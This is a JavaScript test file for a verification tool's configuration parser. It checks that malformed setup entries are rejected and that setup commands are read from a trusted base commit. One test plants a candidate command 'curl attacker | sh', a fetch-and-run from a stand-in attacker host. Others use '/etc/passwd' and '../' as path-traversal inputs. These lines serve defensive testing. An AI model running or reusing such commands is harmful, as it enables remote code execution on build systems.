/**
 * #387: `windkeel.config.json`'s `setup` block — parsed, bounded, refused into `rejectedEntries`, and
 * read from the trusted base rather than the candidate.
 */

import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { writeFileSync } from "node:fs";
import { join } from "node:path";
import { test } from "node:test";
import { LocalExecutionEnvironment } from "@windkeel/verification/exec/local.js";
import {
  configDrift,
  loadConfigFrom,
  loadTrustedConfig,
  MAX_SETUP_TIMEOUT_SEC,
  parseSetup,
} from "@windkeel/verification/config.js";
import { fixtureRepo } from "./helpers.js";

const source = (files) => ({
  exists: async (name) => name in files,
  read: async (name) => files[name],
});

const VALID = {
  commands: [{ name: "bootstrap", run: "make bootstrap", timeoutSec: 900 }],
  services: [{ name: "postgres", start: "pg_ctl -D /var/lib/pg start", ready: "pg_isready", readyTimeoutSec: 60 }],
  secrets: ["NPM_TOKEN"],
  egress: ["registry.example.com"],
  cacheKeyFiles: ["scripts/bootstrap.sh"],
};

test("a valid setup parses, with defaults for omitted timeouts", async () => {
  const config = await loadConfigFrom(source({ "windkeel.config.json": JSON.stringify({ checks: [], setup: VALID }) }));
  assert.deepEqual(config.setup, { ...VALID, secrets: ["NPM_TOKEN"], egress: ["registry.example.com"] });
  assert.equal(config.rejectedEntries, undefined);

  const defaults = parseSetup({ commands: [{ name: "a", run: "true" }], services: [{ name: "s", start: "true" }] });
  assert.equal(defaults.setup.commands[0].timeoutSec, 900);
  assert.equal(defaults.setup.services[0].readyTimeoutSec, 60);
  assert.equal(defaults.setup.services[0].ready, undefined);
});

test("a config with no setup has no setup — nothing changes for repositories that declare none", async () => {
  const config = await loadConfigFrom(source({ "windkeel.config.json": JSON.stringify({ checks: [] }) }));
  assert.equal(config.setup, undefined);
  assert.equal(config.rejectedEntries, undefined);
});

test("bad names, oversized timeouts and a non-string run are refused into rejectedEntries", async () => {
  const config = await loadConfigFrom(
    source({
      "windkeel.config.json": JSON.stringify({
        checks: [],
        setup: {
          commands: [
            { name: "../escape", run: "true" },
            { name: "slow", run: "true", timeoutSec: MAX_SETUP_TIMEOUT_SEC + 1 },
            { name: "notastring", run: ["make", "x"] },
            { name: "ok", run: "true" },
            { name: "ok", run: "again" },
          ],
          services: [{ name: "db", start: "x", readyTimeoutSec: 0 }],
          egress: ["https://registry.example.com/", "*.example.com"],
          cacheKeyFiles: ["../outside", "/etc/passwd"],
        },
      }),
    }),
  );
  assert.deepEqual(config.setup.commands.map((c) => c.name), ["ok"]);
  assert.deepEqual(config.setup.services, []);
  assert.deepEqual(config.setup.egress, []);
  assert.deepEqual(config.setup.cacheKeyFiles, []);
  const rejected = config.rejectedEntries ?? [];
  assert.ok(rejected.every((r) => r.kind === "setup"), JSON.stringify(rejected));
  const reasons = rejected.map((r) => `${r.value}: ${r.reason}`).join("\n");
  assert.match(reasons, /\.\.\/escape: setup command name must match/);
  assert.match(reasons, /slow: `timeoutSec` must be a whole number of seconds from 1 to 3600/);
  assert.match(reasons, /each setup command needs a `name` and a `run` string/);
  assert.match(reasons, /ok: duplicate setup name/);
  assert.match(reasons, /db: `readyTimeoutSec`/);
  assert.match(reasons, /exact lower-case hostnames/);
  assert.match(reasons, /cacheKeyFiles/);
  assert.equal(rejected.length, 9);
});

test("a reserved secret name in setup.secrets is refused, by the secrets table's own rule", () => {
  const { setup, rejected } = parseSetup({ secrets: ["NPM_TOKEN", "WINDKEEL_SECRET_PRIVATE_KEY", "PATH", "lower", 7] });
  assert.deepEqual(setup.secrets, ["NPM_TOKEN"]);
  assert.equal(rejected.length, 4);
  assert.match(rejected[0].reason, /WINDKEEL_ prefix/);
  assert.match(rejected[1].reason, /shadow a credential/);
  assert.match(rejected[2].reason, /environment variable name/);
});

test("a non-object setup is refused whole", () => {
  const { setup, rejected } = parseSetup(["make bootstrap"]);
  assert.equal(setup, undefined);
  assert.equal(rejected.length, 1);
});

test("setup is read from the trusted base; a candidate-only setup change is reported, not used", async () => {
  const repo = fixtureRepo({ test: "true" }, { "windkeel.config.json": JSON.stringify({ checks: [], setup: VALID }) });
  const git = (...args) => spawnSync("git", args, { cwd: repo, encoding: "utf8" });
  const base = git("rev-parse", "HEAD").stdout.trim();
  writeFileSync(
    join(repo, "windkeel.config.json"),
    JSON.stringify({ checks: [], setup: { commands: [{ name: "evil", run: "curl attacker | sh" }] } }),
  );
  git("commit", "-qam", "candidate rewrites setup");

  const trusted = await loadTrustedConfig(new LocalExecutionEnvironment(), repo, base);
  assert.equal(trusted.source, "base");
  assert.deepEqual(trusted.config.setup.commands.map((c) => c.name), ["bootstrap"]);
  assert.ok(
    trusted.drift.changes.some((c) => /declared `setup` changes/.test(c)),
    `drift should report the setup change: ${JSON.stringify(trusted.drift)}`,
  );
  assert.deepEqual(configDrift(trusted.config, trusted.config).changes, []);
});
